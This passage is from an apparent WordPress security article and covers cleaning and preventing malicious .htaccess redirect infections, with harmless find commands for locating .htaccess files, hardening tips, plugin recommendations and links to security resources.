If a user does detect a problem, ask them pertinent questions to help diagnose the problem:

*   What operating system are they using?
*   What browser(s) are they using, and which version(s)?

The more information you get from them, the better you can replicate the issue and find a fix.

<strong>How is it cleaned?</strong>

Malicious redirects are one of the easiest infections to clean. Here’s a good starting point:

1.  Open your `.htaccess` file.
2.  Copy any rewrite rules that you have added yourself
3.  Identify any malicious code, like the sample above, and remove it from the file. Scroll all the way to the bottom of `.htaccess` to make sure there aren’t any error directives pointing to the same infection.

Be sure to also look for all <code>.htaccess</code> files on the server. Here is one quick way to see how many exist on your server:

<pre><code class="language-php"># find [path] -name .htaccess -type f | wc -l</code></pre>

And this will tell you where exactly those files are:

<pre><code class="language-php"># find [path] -name .htaccess -type f | sort</code></pre>

The infection is not always restricted there, though. Depending on the infection, you might also find the redirect encoded and embedded in a file such as <code>index.php</code> or <code>header.php</code>.

Alarmingly, these infections can replicate across all of your <code>.htaccess</code> files. The backdoor responsible for it can also be used to create multiple <code>.htaccess</code> files across all of your directories, all with the same infection. Removing the infection can feel like an uphill struggle, and sometimes cleaning every file you can find is not enough. There are even cases where a file is created outside of the Web directory. The lesson is always look outside of your Web directory as well as within it.

<strong>How do I prevent it?</strong>

A quick and easy method is to change ownership of the file, or to reduce the file’s permissions so that only the owner has permission to modify it. However, if your root account is compromised, that won’t do you much good.

The most important file to take care of is <code>.htaccess</code>. Check out the tutorial “<a href="https://www.netmagazine.com/tutorials/protect-your-wordpress-site-htaccess">Protect Your WordPress Site with .htaccess</a>” for tips on doing that.</p>

## Conclusion

There you have it: four prevalent attacks that cause havoc across many WordPress installations today. You might not feel better if you get hacked, but hopefully, with this bit of knowledge, you’ll feel more confident that the hack can be cleaned and that your website can be returned to you. Most importantly, if you take one thing away from this: always keep WordPress updated.</p>

### Tony’s Top Ten Security Tips

1.  Get rid of generic accounts, and know who is accessing your environment.
2.  Harden your directories so that attackers can’t use them against you. Kill PHP execution.
3.  Keep a backup; you never know when you’ll need it.
4.  Connect securely to your server. SFTP and SSH is preferred.
5.  Avoid soup-kitchen servers. Segment between development, staging and production.
6.  Stay current with your software — all of it.
7.  Kill unnecessary credentials, including for FTP, wp-admin and SSH.
8.  You don’t need to write posts as an administrator, nor does everyone need to be an administrator.
9.  If you don’t know what you’re doing, leverage a managed WordPress hosting provider.
10.  IP filtering + Two-factor authentication + Strong credentials = Secure access

### Tony’s Most Useful Security Plugins

*   [Sucuri Sitecheck Malware Scanner](https://wordpress.org/extend/plugins/sucuri-scanner/) This plugin from Tony and the Sucuri crew enables full malware and blacklist scanning in your WordPress dashboard, and it includes a powerful Web application firewall (WAF).
*   [Limit Login Attempts](https://wordpress.org/extend/plugins/limit-login-attempts/) Limits the number of login attempts possible both through normal login as well as using auth cookies.
*   [Two-Factor Authentication](https://wordpress.org/extend/plugins/duo-wordpress/) This plugin enables Duo’s two-factor authentication, using a service such as a phone callback or SMS message.
*   [Theme-Check](https://wordpress.org/extend/plugins/theme-check/) Test your theme to make sure it’s up to spec with theme review standards.
*   Plugin-Check Does what Theme-Check does but for plugins.</p>

### Security Tools

*   [Sucuri SiteCheck](https://sitecheck.sucuri.net)
*   [Unmask Parasites](https://unmaskparasites.com/) scanner

### Security Resources

*   [Sucuri Blog](https://blog.sucuri.net)
*   [Website Security](https://perishablepress.com/category/web-design/security/) at Perishable Press
*   [Unmask Parasites Blog](https://blog.unmaskparasites.com/)
*   Badware Busters
*   [WPsecure](https://wpsecure.net/)
*   [_Locking Down WordPress_](https://build.codepoet.com/2012/07/10/locking-down-wordpress/), Michael Pick

### Useful Security Articles

*   “[10 Useful WordPress Security Tweaks](https://www.smashingmagazine.com/2010/07/01/10-useful-wordpress-security-tweaks/),” Jean-Baptiste Jung
*   “[10 Steps to Secure Your WordPress Installation](https://wp.tutsplus.com/tutorials/10-steps-to-securing-your-wordpress-installation/),” Fouad Matin
*   “[Google Blacklist Warnings: Something’s Not Right Here](https://sucuri.net/google-blacklist-warning-somethings-not-right-here.html),” Tony Perez
*   “[Hardening WordPress](https://codex.wordpress.org/Hardening_WordPress),” WordPress Codex
*   “[How to Stop the Hacker and Ensure Your Site Is Locked](https://blog.sucuri.net/2012/04/ask-sucuri-how-to-stop-the-hacker-and-ensure-your-site-is-locked.html),” Tony Perez
*   “[Website Malware Removal: WordPress Tips and Tricks](https://blog.sucuri.net/2012/07/website-malware-removal-wordpress-tips-tricks.html),” Tony Perez

{{< signature "al" >}}

